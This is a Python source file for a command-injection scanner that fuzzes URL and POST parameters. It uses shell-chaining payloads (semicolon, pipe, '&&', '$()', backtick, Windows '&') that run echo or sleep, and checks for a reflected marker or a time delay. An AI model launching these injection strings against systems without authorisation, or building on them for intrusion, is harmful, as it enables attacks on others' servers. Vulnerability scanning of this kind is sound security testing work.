# cmdi_engine.py — Native Python command injection prober (commix-style)
# Tests URL parameters and POST bodies for OS command injection vulnerabilities.
import urllib.request
import urllib.error
import urllib.parse
import queue
import re
import time

result_queue = queue.Queue()
is_running = False

# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

# Inline execution payloads — the tracker string appears in the response if vulnerable
_INLINE_PAYLOADS = [
    # Unix shell: semicolon separation
    (";echo cmdi_{T};",          "inline-semicolon"),
    ("&&echo cmdi_{T}&&",        "inline-and"),
    ("|echo cmdi_{T}",           "inline-pipe"),
    ("\necho cmdi_{T}\n",        "inline-newline"),
    # Subshell
    ("$(echo cmdi_{T})",         "subshell"),
    ("`echo cmdi_{T}`",          "backtick"),
    # Windows
    ("&echo cmdi_{T}&",          "win-and"),
    ("|echo cmdi_{T}",           "win-pipe"),
]

# Blind time-based payloads — vulnerability detected by response delay
_TIME_PAYLOADS = [
    (";sleep 5;",      "time-semicolon",   5),
    ("&&sleep 5&&",    "time-and",         5),
    ("|sleep 5",       "time-pipe",        5),
    ("$(sleep 5)",     "time-subshell",    5),
    ("`sleep 5`",      "time-backtick",    5),
    ("& timeout 5 &",  "time-win-timeout", 5),
]

# Characters that may reveal a WAF or filter is stripping input
_CANARY_CHARS = [";", "|", "&", "`", "$", "(", ")", "\n", "\\"]


def _fetch(url, data=None, headers=None, timeout=12):
    h = {"User-Agent": "Mozilla/5.0"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(
        url,
        data=data.encode() if isinstance(data, str) else data,
        headers=h,
        method="POST" if data is not None else "GET",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read(131072).decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(131072).decode("utf-8", errors="ignore")
        except Exception:
            pass
        return e.code, body
    except Exception:
        return None, ""


def _inject_param(base_url, param, value, method, post_params=None):
    """Return (url, post_body) for a given injection value."""
    if method.upper() == "POST" and post_params is not None:
        modified = dict(post_params)
        modified[param] = value
        return base_url, urllib.parse.urlencode(modified)
    else:
        parsed = urllib.parse.urlparse(base_url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = value
        new_qs = urllib.parse.urlencode(qs)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
        return new_url, None


def _discover_params(base_url):
    """Pull parameter names from the URL query string."""
    parsed = urllib.parse.urlparse(base_url)
    params = [k for k, _ in urllib.parse.parse_qsl(parsed.query)]
    return params if params else ["id", "cmd", "exec", "query", "input", "ping", "host"]


def run_cmdi_scan(base_url, params=None, method="GET", post_params=None, tracker=None):
    """Run command injection probes against base_url.

    Args:
        base_url:    Target URL (with or without query string).
        params:      List of parameter names to fuzz. Auto-discovered if None.
        method:      "GET" or "POST".
        post_params: Dict of POST parameters (used when method="POST").
        tracker:     Unique string to look for in responses. Auto-generated if None.
    """
    global is_running
    is_running = True

    if tracker is None:
        import random, string
        tracker = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    if params is None:
        params = _discover_params(base_url)

    result_queue.put(("STATUS", f"Starting CMDi scan: {base_url}"))
    result_queue.put(("STATUS", f"Parameters: {params} | Method: {method} | Tracker: {tracker}"))

    # Baseline
    b_url, b_body_data = _inject_param(base_url, params[0], "1", method, post_params)
    _, baseline_body = _fetch(b_url, data=b_body_data, timeout=10)

    for param in params:
        if not is_running:
            break
        result_queue.put(("STATUS", f"Probing parameter: {param}"))

        # --- Phase 1: inline reflection payloads ---
        for template, label in _INLINE_PAYLOADS:
            if not is_running:
                break
            payload = template.replace("{T}", tracker)
            url, post_data = _inject_param(base_url, param, "1" + payload, method, post_params)
            status, body = _fetch(url, data=post_data, timeout=12)
            if status is None:
                continue
            marker = f"cmdi_{tracker}"
            if marker in body:
                result_queue.put(("FAIL", f"[CMDi CONFIRMED] param={param} payload={label} | echo reflected in response"))
                result_queue.put(("INFO", f"  Payload: {payload.strip()}"))
                continue

        # --- Phase 2: time-based blind payloads ---
        for payload, label, delay in _TIME_PAYLOADS:
            if not is_running:
                break
            url, post_data = _inject_param(base_url, param, "1" + payload, method, post_params)
            t0 = time.time()
            status, body = _fetch(url, data=post_data, timeout=delay + 8)
            elapsed = time.time() - t0
            if elapsed >= delay * 0.85:
                result_queue.put(("FAIL", f"[CMDi BLIND] param={param} payload={label} | response delayed {elapsed:.1f}s (expected {delay}s)"))
                result_queue.put(("INFO", f"  Payload: {payload.strip()}"))

        # --- Phase 3: canary char filter probe ---
        surviving = []
        for ch in _CANARY_CHARS:
            if not is_running:
                break
            url, post_data = _inject_param(base_url, param, f"test{ch}test", method, post_params)
            _, body = _fetch(url, data=post_data, timeout=10)
            if body and f"test{ch}test" in body:
                surviving.append(repr(ch))
        if surviving:
            result_queue.put(("WARN", f"Special chars reflected unfiltered in param={param}: {', '.join(surviving)}"))
        else:
            result_queue.put(("PASS", f"Param={param}: special chars appear filtered or not reflected"))

    is_running = False
    result_queue.put(("DONE", "CMDi scan complete."))


def stop_cmdi_scan():
    global is_running
    is_running = False
